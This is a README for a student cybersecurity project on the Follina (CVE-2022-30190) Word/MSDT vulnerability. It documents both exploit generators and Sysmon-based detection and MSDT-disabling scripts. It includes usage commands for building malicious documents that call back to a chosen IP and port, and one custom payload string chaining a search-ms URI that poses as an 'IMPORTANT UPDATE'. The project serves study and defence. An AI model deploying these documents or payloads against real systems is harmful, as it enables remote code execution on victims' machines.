# Five Nights at Follina's
A Fullstack Academy Cybersecurity project examining the full cycle of the Follina (CVE-2022-30190) vulnerability, from exploit to detection and defense.

Team:
- [Brian Aldrich](https://github.com/SB-Aldrich)
- [YoungWa Kim](https://github.com/T4369)
- [Jay O'Neill](https://github.com/rhomv)
- [(Binyang) Jeffrey Xu](https://github.com/jeffymcjeffface)

This set of tools assumes that you have a web host or can spin up a simple webserver using Python to host the generated or example payload files. 

# Disclaimer
The files in the Example Payloads folder contain actual malicious code. These were used with VMs on a local network and should not pose a problem on a secure network where you trust all machines, but please take care when using or modifying these files. Additionally, the document and payload generators obviously create malicious files of their own. Please use these tools only on VMs or other disposable environments! Don't use any tools here you don't understand.

# Offensive Tools
To create the Microsoft Word document with the Follina exploit, run docgen_v3.py, using the following options
- --extention/-e : change the document output from .doc (default) to rtf for a zero click attack. -e rtf
- --ip_address/-ip : change the IP address the document will try to reach out to (detault is 10.0.2.15).
- --port/-p : changes the port it will try to reach out to (default is 8000)

To create a payload html file, use generate_payload.py with either the `poc` subcommand to generate a proof of concept payload that opens the Windows Calculator or the `custom` subcommand to generate a payload with your own script.

Examples:
- `python generate_payload.py poc -o test.html` will generate the calculator payload in test.html
- `python generate_payload.py custom -o test.html -p "search-ms:query=procmon.exe&crumb=location:%5C%5Clive.sysinternals.com%5Ctools&displayname=IMPORTANT%20UPDATE"` will generate test.html as a custom payload with the SearchNightmare exploit

Example payloads can be found in the "Example Payloads" folder.

# Defensive Tools
Follina detection requires Sysmon to be installed to log events. Our detection methods here rely on finding instances where Microsoft Word calls MSDT.exe, but the scripts can be modified to search for other artifacts such as the arguments used by Follina in its Powershell command. The following tools are available:
- The Python scripts in the Sysmon Search folder allow a user to search their Sysmon logs for possible indicators of compromise by Follina and then manually examine those logs for confirmation.
- The msdt_exp-del-v3.ps1 Powershell script performs a similar search and, if it detects signs of Follina, makes a backup of the MSDT registry key and disables MSDT by deleting the key.
